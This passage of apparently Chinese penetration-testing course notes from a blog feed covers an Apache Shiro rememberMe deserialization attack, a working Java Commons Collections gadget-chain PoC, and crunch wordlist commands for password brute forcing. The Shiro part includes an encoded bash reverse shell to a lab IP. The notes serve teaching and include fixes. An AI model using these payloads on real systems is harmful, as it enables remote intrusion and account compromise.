Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}</code> </p><h3 id="kali-JRMPListener"><a href="#kali-JRMPListener" class="headerlink" title="kali JRMPListener"></a>kali JRMPListener</h3><p><code>cd /root/vuln/shiro</code> </p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}"</code> </p><h3 id="python生成Cookie"><a href="#python生成Cookie" class="headerlink" title="python生成Cookie"></a>python生成Cookie</h3><p>python3 shiro.py 192.168.142.132:8888 </p><p>可能需要 pip3 install pycrypto </p><p>得到 </p><p><code>rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</code> </p><h3 id="Burp抓包"><a href="#Burp抓包" class="headerlink" title="Burp抓包"></a>Burp抓包</h3><p>勾选remember me，火狐浏览器抓登录的包 </p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-none"><code class="language-none">POST /doLogin HTTP/1.1Host: 192.168.142.128:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-formurlencodedContent-Length: 47Origin: http://192.168.142.128:8080Connection: closeReferer: http://192.168.142.128:8080/doLoginCookie: JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==Upgrade-Insecure-Requests: 1username=admi&amp;password=n&amp;rememberme=remember-me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h1><ol><li><p>升级Shiro </p></li><li><p>安全产品 </p></li><li><p>防御工具库 </p><p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/apache-commons-collections-fan-xu-lie-hua/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/apache-commons-collections-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞爆出"><a href="#漏洞爆出" class="headerlink" title="漏洞爆出"></a>漏洞爆出</h2><ul><li>2015.01.28 Gabriel Lawrence和Chris Frohoff</li></ul><p><a href="https://speakerdeck.com/frohoff/appseccali-2015-marshalling-pickles-how-deserializing-objects-can-ruin-your-day">https://speakerdeck.com/frohoff/appseccali-2015-marshalling-pickles-how-deserializing-objects-can-ruin-your-day</a> </p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> </p><ul><li>2015.11.06 FoxGlove Security @breenmachine</li></ul><p><a href="https://commons.apache.org/proper/commons-collections/release_3_2_2.html">https://commons.apache.org/proper/commons-collections/release_3_2_2.html</a> </p><p><a href="https://issues.apache.org/jira/browse/COLLECTIONS-580">https://issues.apache.org/jira/browse/COLLECTIONS-580</a></p><h2 id="本地复现环境"><a href="#本地复现环境" class="headerlink" title="本地复现环境"></a>本地复现环境</h2><ul><li>jdk 1.7.0_80</li><li>IDEA Project Structrure、Settings——Java compile等设置成java7</li><li>Apache Commons Collections ≤ 3.2.</li></ul><h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><ol><li>Apache Commons Collections介绍 </li><li>Java反射机制 </li><li>Apache Commons Collections漏洞原理 </li><li>漏洞修复</li></ol><h1 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h1><h2 id="Java集合"><a href="#Java集合" class="headerlink" title="Java集合"></a>Java集合</h2><p>List</p><p>Map </p><p>Set</p><p><img src="assets/image-20221127162108970.png" alt="image-20221127162108970"></p><h2 id="Commons-Collection"><a href="#Commons-Collection" class="headerlink" title="Commons Collection"></a>Commons Collection</h2><p><a href="https://commons.apache.org/proper/commons-collections/">https://commons.apache.org/proper/commons-collections/</a> </p><ul><li><strong>Bag interface</strong> for collections that have a number of copies of each object </li><li><strong>BidiMap interface</strong> for maps that can be looked up from value to key as well and key to value </li><li><strong>MapIterator</strong> interface to provide simple and quick iteration over maps </li><li><strong>Transforming decorators</strong> that alter each object as it is added to the collection </li><li><strong>Composite collections</strong> that make multiple collections look like one </li><li><strong>Ordered maps</strong> and sets that retain the order elements are added in, including an LRU based map </li><li><strong>Reference map</strong> that allows keys and/or values to be garbage collected under close control </li><li>Many <strong>comparator</strong> implementations </li><li>Many <strong>iterator</strong> implementations </li><li><strong>Adapter classes</strong> from array and enumerations to collections </li><li><strong>Utilities</strong> to test or create typical set-theory properties of collections such as union, intersection, and closure</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;commons-collections&lt;/groupId&gt;&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;&lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h2><ol><li>哪里出现了可以<strong>执行任意代码</strong>的问题？ </li><li>序列化的payload怎么构造？</li></ol><h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>Java代码运行原理： </p><ol><li>源码 </li><li>编译器（javac）编译为字节码.class文件</li><li>各平台JVM解释器把字节码文件转换成操作系统指令</li></ol><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><pre class="line-numbers language-none"><code class="language-none">Person obj= new Person("wuya", 666);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>在程序运行的时候动态创建一个类的实例， </p><p>调用实例的方法和访问它的属性 </p><pre class="line-numbers language-none"><code class="language-none">Class —— Instance Person —— new Person("无涯")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Apache-Commons-Collections-漏洞原理-≤-3-2"><a href="#Apache-Commons-Collections-漏洞原理-≤-3-2" class="headerlink" title="Apache Commons Collections 漏洞原理 ≤ 3.2."></a>Apache Commons Collections 漏洞原理 ≤ 3.2.</h1><h2 id="CC漏洞"><a href="#CC漏洞" class="headerlink" title="CC漏洞"></a>CC漏洞</h2><ul><li>2015年黑客Gabriel Lawrence和Chris Frohoff发现 </li><li>影响WebLogic、WebSphere、JBoss、Jenkins、 OpenNMS等大型框架</li></ul><h2 id="CC关键类"><a href="#CC关键类" class="headerlink" title="CC关键类"></a>CC关键类</h2><ul><li>InvokeTransformer</li></ul><p>利用Java反射机制来创建类实例 </p><ul><li>ChainedTransformer</li></ul><p>实现了Transformer链式调用，我们只需要传入一个Transformer数组 ChainedTransformer就可以实现依次的去调用每一个Transformer的 transform()方法 </p><ul><li>ConstantTransformer transform()</li></ul><p>返回构造函数的对象 </p><ul><li>TransformedMa</li></ul><h2 id="调用链路"><a href="#调用链路" class="headerlink" title="调用链路"></a>调用链路</h2><p><img src="assets/image-20221127163102008.png" alt="image-20221127163102008"></p><h2 id="poc构造思路"><a href="#poc构造思路" class="headerlink" title="poc构造思路"></a>poc构造思路</h2><ol><li><p>InvokeTransformer </p><p>反射执行代码 </p></li><li><p>ChainedTransformer</p><p>链式调用，自动触发 </p></li><li><p>ConstantTransformer </p><p>获得对象 </p></li><li><p>TransformedMap</p><p>元素变化执行transform，setValue——checkSetValue </p></li><li><p>AnnotationInvocationHandler readObject </p><p>调用Map的setValue</p></li></ol><h2 id="poc源码"><a href="#poc源码" class="headerlink" title="poc源码"></a>poc源码</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>wuya<span class="token punctuation">.</span>apache</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token comment">/** * 封装为TransformedMap */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                    <span class="token comment">// 获得Runtime类对象</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入Runtime类对象 反射执行getMethod获得getRuntime方法</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                            <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span>                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span>                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入Runtime实例 执行exec方法</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span> innermap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            innermap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span> outermap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innermap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 构造包含恶意map的AnnotationInvocationHandler对象</span>            <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> cst <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cst<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> exploitObj <span class="token operator">=</span> cst<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outermap<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 序列化</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exploitObj<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 反序列化</span>            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h1><ol><li>对利用类AnnotationInvocationHandler进行序列化，然后交给Java程序 反序列化 </li><li>在进行反序列化时，会执行readObject()方法，该方法会用setValue对成 员变量TransformedMap的Value值进行修改 </li><li>value修改触发了TransformedMap实例化时传入的参数 InvokerTransformer的checkSetValue——transform()方法 </li><li>放到Map里面的是InvokeTransformer数组，transform()方法被依次调用 </li><li>InvokerTransformer.transform()方法通过反射，调用 Runtime.getRuntime.exec(“xx”)函数来执行系统命令</li></ol><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>升级Apache Commons Collections到最新版 </li><li>升级JDK版本</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/18-mi-ma-bao-li-cai-jie/mi-ma-bao-li-po-jie/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/18-mi-ma-bao-li-cai-jie/mi-ma-bao-li-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="密码安全概述"><a href="#密码安全概述" class="headerlink" title="密码安全概述"></a>密码安全概述</h1><h2 id="密码（password）的作用"><a href="#密码（password）的作用" class="headerlink" title="密码（password）的作用"></a>密码（password）的作用</h2><ol><li>加密 </li><li>完整性 </li><li>身份认证（口令）</li></ol><h2 id="密码安全的分类"><a href="#密码安全的分类" class="headerlink" title="密码安全的分类"></a>密码安全的分类</h2><ol><li>存储安全 </li><li>传输安全 </li><li>输入安全（登录界面）</li></ol><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><ol><li>认证：你是谁 </li><li>授权：你能做什么</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>从数据库获取密码，解密 </li><li>窃听通信数据数据，解密 </li><li>直接从登录框猜测密码</li></ol><h1 id="不安全的密码"><a href="#不安全的密码" class="headerlink" title="不安全的密码"></a>不安全的密码</h1><h2 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h2><ul><li>000000 </li><li>123456 </li><li>空密码 </li><li>身份证号后六位 </li><li>手机号后六位</li></ul><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a></p><h1 id="密码猜解思路"><a href="#密码猜解思路" class="headerlink" title="密码猜解思路"></a>密码猜解思路</h1><h2 id="猜测范围"><a href="#猜测范围" class="headerlink" title="猜测范围"></a>猜测范围</h2><ol><li>密码长度 </li><li>密码内容 0-9 a-z A-Z !@#$%^&amp;*</li></ol><h2 id="APP密码范围"><a href="#APP密码范围" class="headerlink" title="APP密码范围"></a>APP密码范围</h2><p><img src="assets/image-20221208105458299.png" alt="image-20221208105458299"></p><h1 id="字典wordlist"><a href="#字典wordlist" class="headerlink" title="字典wordlist"></a>字典wordlist</h1><h2 id="字典从哪里来？"><a href="#字典从哪里来？" class="headerlink" title="字典从哪里来？"></a>字典从哪里来？</h2><p>通用字典（word list、dict）： </p><ol><li>Kali自带 </li><li>网络下载（百度、github）</li></ol><p>注意使用场合：比如Web网站密码字典、WiFi密码字典、 操作系统用户密码字典、数据库密码字典……</p><h2 id="专用字典"><a href="#专用字典" class="headerlink" title="专用字典"></a>专用字典</h2><ul><li>指定格式字典，比如生日、手机号、QQ号</li></ul><p><code>crunch -h</code> </p><ul><li>社工字典</li></ul><p><code>cupp</code>,<code>ccupp</code> </p><ul><li>文章内容字典</li></ul><p><code>cewl https://sqlmap.org -w dict.txt</code></p><h2 id="kali-crun"><a href="#kali-crun" class="headerlink" title="kali crun"></a>kali crun</h2><p><img src="assets/image-20221208105751125.png" alt="image-20221208105751125"></p><h2 id="crunch案例"><a href="#crunch案例" class="headerlink" title="crunch案例"></a>crunch案例</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>crunch 1 8</td><td>第一个是a，最后一个是zzzzzzzz</td></tr><tr><td>crunch 1 6 abcdefg</td><td>第一个是a，最后一个是gggggg</td></tr><tr><td>crunch 1 6 abcdefg\</td><td>第一个是a，最后一个是6个空格也可以写成 “ abcdefg “</td></tr><tr><td>crunch 1 8 -f charset.lst mixalpha-numericall-space -o wordlist.txt</td><td>第一个是a，最后一个是8个空格 /usr/share/crunch/charset.lst</td></tr><tr><td>crunch 8 8 -f charset.lst mixalpha-numericall-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa</td><td>从cbdogaaa开始，到” dog “结束</td></tr><tr><td>crunch 2 3 -f charset.lst ualpha -s BB</td><td>BB开始，ZZZ结束</td></tr><tr><td>crunch 4 5 -p abc</td><td>（排列组合）生成abc, acb, bac, bca, cab, cba这个时候数字无用</td></tr><tr><td>crunch 4 5 -p dog cat</td><td>（排列组合）生成birdcatdog, birddogcat, catbirddog, catdogbird, dogbirdcat, dogcatbir</td></tr><tr><td>crunch 1 5 -o START -c 6000 -z bzip2</td><td>每个txt文件包含6000个单词，用bzip2压缩文件名： first_word-last_word.txt.bz2bzip2 -d解压</td></tr><tr><td>crunch 4 5 -b 20mib -o START</td><td>生成aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt每个文件呢20M，最后一个是实际大小</td></tr><tr><td>crunch 3 3 abc  + 123 !@# -t @^</td><td>3位长度，格式：小写、数字、字符内容顺序：小写、大写、数 字、符号大写在格式中不包括，用+占位小写包含：abc数字包含： 123符号包含：!@#从a1!开始，c3#结束</td></tr><tr><td>crunch 3 3 abc + 123 !@# -t ^%@</td><td>格式：字符、数字、小写字母</td></tr><tr><td>crunch 4 4 + + 123 + -t %%@^</td><td>4位，格式：数字、数字、小写字母、字符内容顺序：小写、大 写、数字、符号除了数字只有123以外，其他的都不限制从11a! 开始到”33z “结束</td></tr><tr><td>crunch 5 5 -t ddd@@ -o j -p dog cat bird</td><td>从birdcatdogaa开始到dogcatbirdzz结束</td></tr><tr><td>crunch 7 7 -t p@ss,%^ -l a@aaaa</td><td>格式：p@ss大写数字符号@ 小写字母, 大写字母% 数字^ 字符-l 表明该字符为实义字符 从p@ssA0!开始到p@ssZ9 结束</td></tr><tr><td>crunch 5 5 -s @4#S2 -t @%^,2 -e @8 Q2 -l @dddd -b 10KB -o START 有空格 要加双引号</td><td>-s起始字符-e结束字符格式：@数字符号大写2从@4#S2开始，到 @8 Q2结束</td></tr><tr><td>crunch 5 5 -d 2@ -t @@@%%</td><td>从aab00到zzy99-d 限制相同元素出现的次数</td></tr><tr><td>crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START ll -h</td><td>从aab!0001!!开始到zzy 9998 结束每个文件20</td></tr><tr><td>crunch 8 8 -d 2@</td><td>从aabaabaa到zzyzzyzz</td></tr><tr><td>crunch 4 4 -f /usr/share/crunch/unicode_test.lst japanese -t @@%% -l @xdd 下载： <a href="https://github.com/jaalto/external-sf--crunch-wordlist">https://github.com/jaalto/external-sf--crunch-wordlist</a></td><td>从@日00开始，到@語99结束</td></tr></tbody></table><h1 id="python实现暴力破解"><a href="#python实现暴力破解" class="headerlink" title="python实现暴力破解"></a>python实现暴力破解</h1><h2 id="python暴破"><a href="#python暴破" class="headerlink" title="python暴破"></a>python暴破</h2><ol><li>从字典读取值，生成密码 </li><li>HTTP连接到需要暴破的地址 </li><li>获得HTTP响应，分析响应结果，看看有没有错误提示 “Username and/or password incorrect.” </li><li>如果有提示，就继续下一次循环 </li><li>如果没有，就代表暴破成功</li></ol><h1 id="Burp-Suite实现暴力破解"><a href="#Burp-Suite实现暴力破解" class="headerlink" 